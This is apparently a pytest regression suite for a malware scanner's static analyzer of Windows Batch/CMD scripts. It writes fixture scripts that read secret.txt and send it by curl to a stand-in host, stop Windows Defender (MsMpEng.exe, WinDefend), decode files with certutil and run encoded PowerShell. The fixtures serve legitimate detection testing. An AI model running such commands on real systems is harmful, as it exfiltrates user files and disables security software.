"""Phase 23 bounded Windows Batch/CMD frontend regressions."""
from __future__ import annotations

from contextlib import contextmanager
import json
import os
from pathlib import Path

import pytest

from Virus_Scan.contracts.artifact_read_snapshot import build_artifact_read_snapshot
from Virus_Scan.routing.extension_outcome import route_identity_record
from Virus_Scan.routing.extension_scan_router import scan_file_by_type
from Virus_Scan.tests.support.scan_session_fixtures import scan_session_snapshot_fixture
from Virus_Scan.scanners.static_program_analysis import (
    BATCH_CMD_FRONTEND_DIGEST,
    BATCH_CMD_FRONTEND_SCHEMA_VERSION,
    BATCH_CMD_MAX_SOURCE_BYTES,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID,
    STATIC_PROGRAM_ANALYSIS_FRONTENDS,
    analyze_batch_cmd_snapshot,
    batch_cmd_analysis_dependency_digest,
)
from Virus_Scan.storage import scan_cache_repository, sqlite_lifecycle


@contextmanager
def _isolated_runtime(tmp_path: Path):
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=True)
        yield runtime_root
    finally:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous


def _analysis(path: Path):
    return analyze_batch_cmd_snapshot(build_artifact_read_snapshot(path)).analysis


def _by_kind(analysis):
    return {
        kind: tuple(operation for operation in analysis.operations if operation.operation_kind == kind)
        for kind in {operation.operation_kind for operation in analysis.operations}
    }


def test_phase23_batch_registry_has_one_frontend_owner() -> None:
    expected = (
        "javascript_typescript_static_analysis",
        "powershell_static_analysis",
        "batch_cmd_static_analysis",
        "shell_static_analysis",
        "dotnet_il_static_analysis",
        "native_elf_x86_64_static_analysis",
        "python_renpy_static_analysis",
    )
    assert tuple(item.scanner_id for item in STATIC_PROGRAM_ANALYSIS_FRONTENDS) == expected
    frontend = STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID["batch_cmd_static_analysis"]
    assert STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[".bat"] is frontend
    assert STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[".cmd"] is frontend
    assert frontend.frontend_digest == BATCH_CMD_FRONTEND_DIGEST
    assert frontend.schema_version == BATCH_CMD_FRONTEND_SCHEMA_VERSION


def test_phase23_batch_comments_and_echo_documentation_do_not_mint_operations(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "documentation.cmd"
        target.write_text(
            "@echo off\n"
            "rem curl --data secret https://example.invalid\n"
            ":: taskkill /im MsMpEng.exe\n"
            "echo certutil -decode input output\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        assert analysis.parser_status == "complete"
        assert analysis.operations == ()
        assert analysis.flow_edges == ()


def test_phase23_batch_set_p_source_to_curl_sink_has_exact_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "flow.cmd"
        target.write_text(
            "@echo off\n"
            "set /p data=<secret.txt\n"
            "curl --data \"%data%\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        operations = _by_kind(analysis)
        source = operations["file_read"][0]
        sink = operations["network_send"][0]
        upload = operations["network_upload"][0]
        assert source.flow_identity.startswith("flow_")
        assert sink.flow_identity == source.flow_identity
        assert upload.flow_identity == source.flow_identity
        assert source.reachability_state == "entrypoint_reachable"
        assert sink.reachability_state == "entrypoint_reachable"
        assert upload.reachability_state == "entrypoint_reachable"
        flow_targets = {
            edge.target_operation_id for edge in analysis.flow_edges
            if edge.edge_kind == "source_to_sink"
        }
        assert sink.operation_id in flow_targets
        assert upload.operation_id in flow_targets


def test_phase23_batch_multiple_sources_abstain_from_single_sink_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "ambiguous.cmd"
        target.write_text(
            "set /p left=<left.txt\n"
            "set /p right=<right.txt\n"
            "curl --data \"%left%%right%\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        sink = _by_kind(analysis)["network_send"][0]
        assert sink.flow_identity == ""
        assert sink.resolution_state == "partial"
        assert "ambiguous_source_flow" in sink.limitations
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_batch_delayed_expansion_requires_explicit_setlocal(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        missing = tmp_path / "missing_delayed.cmd"
        missing.write_text(
            "set /p data=<secret.txt\n"
            "curl --data \"!data!\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        missing_analysis = _analysis(missing)
        assert _by_kind(missing_analysis)["network_send"][0].flow_identity == ""
        assert "delayed_expansion_without_setlocal" in missing_analysis.unresolved_constructs

        enabled = tmp_path / "enabled_delayed.cmd"
        enabled.write_text(
            "setlocal EnableDelayedExpansion\n"
            "set /p data=<secret.txt\n"
            "curl --data \"!data!\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        enabled_analysis = _analysis(enabled)
        source = _by_kind(enabled_analysis)["file_read"][0]
        sink = _by_kind(enabled_analysis)["network_send"][0]
        assert sink.flow_identity == source.flow_identity


def test_phase23_batch_constant_if_and_label_reachability_are_structural(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "reachability.bat"
        target.write_text(
            "if 1==0 taskkill /im MsMpEng.exe\n"
            "call :called\n"
            "goto :eof\n"
            ":called\n"
            "cmd.exe /c called.exe\n"
            "exit /b\n"
            ":dormant\n"
            "cmd.exe /c dormant.exe\n",
            encoding="utf-8",
        )
        operations = _by_kind(_analysis(target))
        security = operations["security_process_terminate"][0]
        assert security.reachability_state == "unreachable"
        launches = {
            tuple(operation.resolved_arguments["arguments"])[-1]: operation
            for operation in operations["process_launch"]
            if operation.resolved_arguments.get("command") == "cmd.exe"
        }
        assert launches["called.exe"].reachability_state == "entrypoint_reachable"
        assert launches["dormant.exe"].reachability_state == "locally_reachable"


def test_phase23_batch_dynamic_and_duplicate_labels_abstain(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "labels.cmd"
        target.write_text(
            "set target=run\n"
            "call :%target%\n"
            "call :same\n"
            ":same\n"
            "cmd.exe /c first.exe\n"
            ":same\n"
            "cmd.exe /c second.exe\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        assert "dynamic_label_target" in analysis.unresolved_constructs
        assert "duplicate_label:same" in analysis.unresolved_constructs
        assert all(
            operation.reachability_state == "locally_reachable"
            for operation in _by_kind(analysis)["process_launch"]
        )


def test_phase23_batch_certutil_decode_and_copy_preserve_transform_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "transform.cmd"
        target.write_text(
            "certutil -decode encoded.txt decoded.bin\n"
            "copy decoded.bin final.bin\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        kinds = _by_kind(analysis)
        assert kinds["decode"]
        assert len(kinds["file_read"]) == 2
        assert len(kinds["file_write"]) == 2
        assert any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_batch_curl_download_and_upload_have_correct_direction(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "network.cmd"
        target.write_text(
            "curl -o payload.bin https://example.invalid/payload\n"
            "curl -T payload.bin https://example.invalid/upload\n",
            encoding="utf-8",
        )
        kinds = _by_kind(_analysis(target))
        assert kinds["network_download"]
        assert kinds["network_upload"]
        assert kinds["file_write"]
        assert kinds["file_read"]


def test_phase23_batch_security_targets_are_exact_not_generic(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "security.cmd"
        target.write_text(
            "taskkill /im notepad.exe\n"
            "sc stop spooler\n"
            "taskkill /im MsMpEng.exe\n"
            "sc stop WinDefend\n",
            encoding="utf-8",
        )
        kinds = _by_kind(_analysis(target))
        assert len(kinds["security_process_terminate"]) == 1
        assert len(kinds["security_service_stop"]) == 1
        assert len(kinds["process_launch"]) == 4


def test_phase23_batch_generic_commands_and_dynamic_command_names_do_not_overclaim(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "generic.cmd"
        target.write_text(
            "customSend secret\n"
            "set runner=cmd.exe\n"
            "%runner% /c whoami\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        assert analysis.operations == ()
        assert "unclassified_command:customsend" in analysis.unresolved_constructs
        assert "dynamic_command_name" in analysis.unresolved_constructs


def test_phase23_batch_redirection_and_script_directory_are_static(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "redirection.cmd"
        target.write_text(
            "set /p data=<%~dp0secret.txt\n"
            "echo %data% > %~dp0output.txt\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        writes = _by_kind(analysis)["file_write"]
        assert writes
        assert any(
            dict(operation.resolved_arguments).get("path") == "script_directory\\output.txt"
            for operation in writes
        )
        assert any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_batch_cache_is_exact_and_failed_results_are_not_reused(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        good = tmp_path / "good.cmd"
        good.write_text("cmd.exe /c whoami\n", encoding="utf-8")
        snapshot = build_artifact_read_snapshot(good)
        first = analyze_batch_cmd_snapshot(snapshot)
        second = analyze_batch_cmd_snapshot(snapshot)
        assert first.cache_source == "computed"
        assert second.cache_source == "sqlite_cache"
        assert first.analysis.semantic_digest == second.analysis.semantic_digest
        assert first.analysis.parser_digest == BATCH_CMD_FRONTEND_DIGEST

        bad = tmp_path / "bad.cmd"
        bad.write_text('cmd.exe /c "unterminated\n', encoding="utf-8")
        bad_snapshot = build_artifact_read_snapshot(bad)
        bad_first = analyze_batch_cmd_snapshot(bad_snapshot)
        bad_second = analyze_batch_cmd_snapshot(bad_snapshot)
        assert bad_first.analysis.parser_status == "failed"
        assert bad_first.cache_source == "computed"
        assert bad_second.cache_source == "computed"
        assert scan_cache_repository().get_static_analysis(
            content_sha256=bad_snapshot.content_sha256,
            analysis_dependency_digest=batch_cmd_analysis_dependency_digest(),
        ) is None


def test_phase23_batch_cp1252_utf16_and_size_bounds_fail_closed(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        cp1252 = tmp_path / "cp1252.cmd"
        cp1252.write_bytes("echo café\n".encode("cp1252"))
        assert _analysis(cp1252).parser_status == "complete"

        utf16 = tmp_path / "utf16.cmd"
        utf16.write_bytes("cmd.exe /c whoami\n".encode("utf-16"))
        assert _analysis(utf16).parser_status == "complete"

        large = tmp_path / "large.cmd"
        large.write_bytes(b"x" * (BATCH_CMD_MAX_SOURCE_BYTES + 1))
        analysis = _analysis(large)
        assert analysis.parser_status == "truncated"
        assert analysis.integrity_status == "partial"
        assert "source_size_limit_exceeded" in analysis.limitations


def test_phase23_batch_router_preserves_lexical_fallback_and_static_scope(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "route.cmd"
        target.write_text(
            "set /p data=<secret.txt\n"
            "curl --data \"%data%\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        outcome = scan_file_by_type(
            str(target),
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=build_artifact_read_snapshot(target),
        )
        identity = route_identity_record(outcome.identity)
        assert identity is not None
        summary = identity["static_program_analysis"]
        assert summary["scanner_id"] == "batch_cmd_static_analysis"
        assert summary["parser_status"] == "complete"
        decisions = {
            item["scanner_id"]: item
            for item in identity["scanner_execution_plan"]["decisions"]
        }
        assert decisions["batch_cmd_static_analysis"]["outcome_status"] == "complete_with_observation"
        assert decisions["javascript_typescript_static_analysis"]["outcome_status"] == "not_applicable"
        assert decisions["powershell_static_analysis"]["outcome_status"] == "not_applicable"
        assert decisions["python_renpy_static_analysis"]["outcome_status"] == "not_applicable"
        records = tuple(
            record for record in outcome.tag_evidence.records
            if record.source_detector == "batch_cmd_static_analysis"
        )
        assert records
        assert all(record.modality == "static_control_flow" for record in records)

        malformed = tmp_path / "malformed.cmd"
        malformed.write_text('powershell -enc AAA "unterminated\n', encoding="utf-8")
        malformed_outcome = scan_file_by_type(
            str(malformed),
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=build_artifact_read_snapshot(malformed),
        )
        malformed_identity = route_identity_record(malformed_outcome.identity)
        assert malformed_identity is not None
        assert malformed_identity["static_program_analysis"]["parser_status"] == "failed"
        assert "powershell_exec" in malformed_outcome.tags
        assert "encoded_powershell" in malformed_outcome.tags


def test_phase23_batch_physical_records_contain_no_attack_or_probability_authority(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "scope.cmd"
        target.write_text("taskkill /im MsMpEng.exe\n", encoding="utf-8")
        text = json.dumps(_analysis(target).to_record(), sort_keys=True).casefold()
        assert "attack_technique" not in text
        assert "p_mitre" not in text
        assert "runtime_occurrence" not in text
        assert "execution_observed" not in text
